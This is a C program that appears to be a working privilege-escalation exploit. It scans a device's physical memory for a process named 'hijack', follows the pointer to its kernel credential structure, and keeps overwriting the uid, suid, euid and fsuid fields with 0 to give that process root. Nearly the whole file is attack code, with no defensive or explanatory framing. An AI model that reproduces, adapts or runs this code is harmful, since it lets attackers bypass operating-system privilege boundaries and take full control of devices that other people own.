#include <stdio.h>
#include <stdint.h>
#include <string.h>

const uint64_t kernel_start = 0x40000000;
const uint64_t page_offset =  ((uint64_t)(0xffffffffffffffff) << (47 - 1));
const uint64_t DDR_start = 0x40000000;
const uint64_t DDR_end =   0xC0000000;

uint32_t virt_to_phys(uint64_t virt) {
  return (virt & ~page_offset) + kernel_start;
}

int is_aligned(uint64_t addr) {
  return (addr & 0x3) == 0;
}

int is_valid_addr(uint64_t phys_addr) {
  return is_aligned(phys_addr) && phys_addr >= DDR_start && phys_addr < DDR_end; 
}

struct cred {
  volatile uint32_t usage; /* refcounter */
  volatile  uint32_t          uid;            /* real UID of the task */
  volatile  uint32_t          gid;            /* real GID of the task */
  volatile  uint32_t          suid;           /* saved UID of the task */
  volatile  uint32_t          sgid;           /* saved GID of the task */
  volatile  uint32_t          euid;           /* effective UID of the task */
  volatile  uint32_t          egid;           /* effective GID of the task */
  volatile  uint32_t          fsuid;
};

void escalate_process(const char* procname) {
  int len = strlen(procname);

  //for(uint8_t *s = 0x0000000070000000; s < 0xC0000000; s++) {
  uint32_t addr = 0x90000000;
  for(; addr < 0xC0000000; addr++) {
    if((addr & 0x64fffff) == 0x6400000) {
      printf("AT %lx\r\n", addr);
    }

    int found = 1;
    uint8_t *c = (uint8_t*) addr;
    for(int i = 0; i < len; i++) {
      if(*c != procname[i]) {
        found = 0;
        break;
      }
      c++;
    }

    if(found && is_aligned(addr)) {
      uint64_t cred_virt = *(uint64_t*)(addr - 16) /* sizeof two 64bit pointers to cred structures */;
      uint32_t cred_phys = virt_to_phys(cred_virt);

      if(!is_valid_addr(cred_phys)) {
        printf("addr not valid cred_virt=%llx cred_phys=%lx\r\n", cred_virt, cred_phys);
      } else {
        printf("found cred_virt=%llx cred_phys=%lx\r\n", cred_virt, cred_phys);

        volatile struct cred *real_cred = (volatile struct cred*) cred_phys;
        printf("uid: %lu\r\n", real_cred->uid);

        if(real_cred->uid == 1000) {
          printf("probably found process\r\n");
          for(;;) {
            real_cred->usage = 2000;
            real_cred->uid = 0;
            real_cred->suid = 0;
            real_cred->fsuid = 0;
            real_cred->euid = 0;
          }
        }
      }
    }
  }

  printf("no process found\r\n");
}


int main() {
  printf("=== ROOT ===\r\n");
  escalate_process("hijack");
	return 1;
}
